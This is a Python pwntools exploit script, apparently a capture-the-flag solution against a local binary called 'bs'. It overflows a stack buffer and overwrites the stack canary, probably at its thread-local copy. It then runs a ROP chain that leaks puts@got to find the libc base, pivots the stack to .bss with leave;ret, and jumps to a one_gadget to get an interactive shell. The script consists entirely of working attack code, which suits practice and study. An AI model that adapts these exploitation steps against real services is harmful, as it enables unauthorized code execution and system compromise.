from pwn import *

context.log_level = 'debug'

io = remote('127.0.0.1', 10001)		# io = process("./bs")
elf = ELF("bs")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi = 0x400c03
pop_rsi_r15 = 0x400c01
leave_ret = 0x400955

bss_addr = 0x602010

payload  = '\x00'*0x1008
payload += '\x11'*0x8									# canary
payload += p64(bss_addr-0x8)							# rbp
payload += p64(pop_rdi) + p64(elf.got['puts'])			# rdi = puts@got
payload += p64(elf.plt['puts'])							# puts(put@got)
payload += p64(pop_rdi) + p64(0)						# rdi = 0
payload += p64(pop_rsi_r15) + p64(bss_addr) + p64(0)	# rsi = bss_addr
payload += p64(elf.plt['read'])							# read(0, bss_addr,)
payload += p64(leave_ret)				# mov rsp,rbp ; pop rbp ; pop rip
payload  = payload.ljust(0x17e8, '\x00')
payload += '\x11'*0x8									# canary
payload  = payload.ljust(0x2000, '\x00')

io.sendlineafter("send?\n", str(0x2000))
io.send(payload)

io.recvuntil("goodbye.\n")
libc_base = u64(io.recv(6).ljust(8, "\x00")) - libc.symbols['puts']
one_gadget = libc_base + 0xf1147
log.info("libc address: 0x%x" % libc_base)
log.info("one-gadget: 0x%x" % one_gadget)
#raw_input('###')

io.send(p64(one_gadget))
io.interactive()

